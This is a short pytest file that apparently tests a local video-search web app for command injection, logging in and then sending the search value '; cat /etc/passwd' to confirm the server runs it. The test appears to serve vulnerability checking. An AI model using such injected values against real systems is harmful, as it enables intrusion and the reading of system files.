import pytest
import requests

def test_injection():
	url = "http://localhost/"
	with requests.Session() as s:
		# login
		s.post(url+"login.php", data={'username':'test','password':'test'})
		home = s.get("http://localhost/")
		assert("What do you want to watch today" in home.text)
		# upload
		exploit = s.post(url+"search_video.php", data={'search':'; cat /etc/passwd'})
		# check
		assert(exploit.text.find("root") != -1)	
